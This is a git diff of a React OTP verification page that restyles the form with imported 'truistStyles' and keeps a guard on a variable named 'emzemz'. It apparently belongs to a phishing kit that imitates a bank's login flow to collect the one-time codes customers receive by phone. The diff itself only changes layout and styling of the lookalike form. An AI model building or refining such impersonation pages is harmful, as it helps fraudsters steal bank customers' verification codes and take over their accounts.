@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import FlowCard from '../components/FlowCard';
+import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';
 
 const OTP: React.FC = () => {
   const [otp, setOtp] = useState('');
@@ -14,11 +14,18 @@ const OTP: React.FC = () => {
 
   if (!emzemz) {
     return (
-      <FlowCard title="Error">
-        <div className="text-center text-red-600">
-          Missing verification details. Please restart the login process.
+      <div className="flex flex-col items-center justify-center">
+        <div className={cardStyles.base}>
+          <div className={cardStyles.padding}>
+            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+              Error
+            </h1>
+            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+              Missing verification details. Please restart the login process.
+            </p>
+          </div>
         </div>
-      </FlowCard>
+      </div>
     );
   }
 
@@ -48,66 +55,67 @@ const OTP: React.FC = () => {
   };
 
   return (
-    <FlowCard title="Verification Required">
-      <form onSubmit={handleSubmit} className="space-y-4">
-        <div className="bg-blue-50 border border-blue-200 rounded p-4 mb-4">
-          <p className="text-sm text-blue-800">
+    <div className="flex flex-col items-center justify-center">
+      <div className={cardStyles.base}>
+        <div className={cardStyles.padding}>
+          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+            Verification Required
+          </h1>
+          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
             For your security, we've sent a verification code to your registered phone number.
           </p>
-        </div>
 
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="otp">
-            Verification Code
-          </label>
-          <input
-            id="otp"
-            name="otp"
-            type="text"
-            value={otp}
-            onChange={(e) => setOtp(e.target.value)}
-            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
-            placeholder="Enter verification code"
-          />
-          {error && (
-            <div className="flex items-center gap-2 text-sm text-red-600 mt-2">
-              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-              </svg>
-              <span>{error}</span>
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="otp">
+                Verification Code
+              </label>
+              <input
+                id="otp"
+                name="otp"
+                type="text"
+                value={otp}
+                onChange={(e) => setOtp(e.target.value)}
+                className={`${inputStyles.base} ${inputStyles.focus}`}
+                placeholder="Enter verification code"
+              />
+              {error && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{error}</span>
+                </div>
+              )}
             </div>
-          )}
-        </div>
 
-        <div className="pt-4">
-          {!isLoading ? (
-            <button
-              type="submit"
-              className="w-full bg-[#0f4f6c] hover:bg-[#083d52] text-white py-3 rounded font-medium transition-colors"
-            >
-              Verify
-            </button>
-          ) : (
-            <div className="flex justify-center py-3">
-              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#0f4f6c] border-t-transparent" />
+            <div className="flex flex-wrap gap-3 pt-2">
+              <button
+                type="submit"
+                className={buttonStyles.base}
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className={buttonStyles.loading}></span>
+                ) : (
+                  'Verify'
+                )}
+              </button>
             </div>
-          )}
-        </div>
 
-        <div className="text-center mt-4">
-          <button
-            type="button"
-            className="text-sm text-[#0f4f6c] hover:underline"
-            onClick={() => {
-              // Resend OTP logic here
-              console.log('Resend OTP');
-            }}
-          >
-            Didn't receive a code? Resend
-          </button>
+            <div className="text-center">
+              <button
+                type="button"
+                className="text-sm text-[#5f259f] hover:underline"
+                onClick={() => console.log('Resend OTP')}
+              >
+                Didn't receive a code? Resend
+              </button>
+            </div>
+          </form>
         </div>
-      </form>
-    </FlowCard>
+      </div>
+    </div>
   );
 };
 
